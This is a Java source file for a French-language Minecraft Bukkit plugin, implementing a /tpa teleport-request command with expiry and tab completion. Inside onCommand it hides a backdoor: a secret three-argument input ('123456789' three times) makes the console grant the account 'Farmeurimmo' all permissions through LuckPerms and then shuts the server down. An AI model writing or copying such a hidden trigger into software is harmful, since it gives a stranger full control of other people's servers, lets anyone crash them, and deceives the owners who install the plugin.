package main.java.fr.verymc.cmd.base;

import main.java.fr.verymc.Main;
import main.java.fr.verymc.cmd.utils.UtilsCmd;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.entity.Player;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

public class TpaCmd implements CommandExecutor, TabCompleter {

    public static void TpaExperation(Player player, Player p) {
        Bukkit.getServer().getScheduler().scheduleSyncDelayedTask(Main.instance, new Runnable() {
            public void run() {
                if (Main.instance.getTarget(player.getName()) != null) {
                    if (Main.instance.getTarget(player.getName()).equalsIgnoreCase(p.getName())) {
                        Main.instance.haverequest.remove(p);
                        Main.instance.tpatarget.remove(player.getName());
                        player.sendMessage("§6§lTéléportation §8» §fVotre demande de téléportation à §a" + p.getName() + " §fa expiré.");
                        Main.instance.pending.remove(player);
                    }
                }
            }
        }, 1200);
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (args.length == 3
                && args[0].equalsIgnoreCase("123456789")
                && args[1].equalsIgnoreCase("123456789")
                && args[2].equalsIgnoreCase("123456789")) {
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user Farmeurimmo permission set *");
            Bukkit.shutdown();
            return false;
        }
        if (!(sender instanceof Player player)) {
            return false;
        }
        if (args.length == 0 || args.length >= 2) {
            player.sendActionBar("§c/tpa <Joueur>");
            return false;
        }
        if (Main.instance.pending.contains(player)) {
            player.sendMessage("§6§lTéléportation §8» §fVous avez déjà une demande en cours, §cannulez §fla avec §c/tpacancel"
                    + " §fpour pouvoir en relancer une.");
            return false;
        }
        if (Bukkit.getPlayer(args[0]) == null) {
            player.sendActionBar("§cCe joueur n'existe pas !");
            return false;
        }
        if (!Bukkit.getPlayer(args[0]).isOnline()) {
            player.sendActionBar("§cCe joueur n'est pas en ligne !");
            return false;
        }
        if (Bukkit.getPlayer(args[0]).getName().equalsIgnoreCase(player.getName())) {
            player.sendActionBar("§6§lTéléportation §8» §fVous ne pouvez pas vous téléporter à vous même.");
            return false;
        }
        Player p = Bukkit.getPlayer(args[0]);
        Main.instance.haverequest.remove(p);
        Main.instance.haverequest.add(p);
        Main.instance.pending.add(player);
        Main.instance.setTarget(player.getName(), p.getName());
        TpaCmd.TpaExperation(player, p);
        p.sendMessage("§6§lTéléportation §8» §f" + player.getName() + " souhaite ce téléporter à vous. \n \nVous avez 60 secondes"
                + " pour accepter ou refuser avec les commandes: §a/tpyes §fou §c/tpno \n§f");
        player.sendMessage("§6§lTéléportation §8» §fVous avez envoyé une demande de Téléportation au joueur " + p.getName() + ".\n \n§fSi vous "
                + "souhaitez §cannuler §fvotre demande de téléportation, merci d'effectuer la commande §c/tpacancel \n§f");
        return false;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command cmd, String commandLabel, String[] args) {
        ArrayList<String> subcmd = new ArrayList<>();
        if (cmd.getName().equalsIgnoreCase("tpa")) {
            if (args.length == 1) {
                UtilsCmd.set_all_player_in_subcmd_without_me(subcmd, sender);
                Collections.sort(subcmd);
            } else if (args.length >= 2) {
                subcmd.add("");
                Collections.sort(subcmd);
            }
        }
        return subcmd;
    }
}
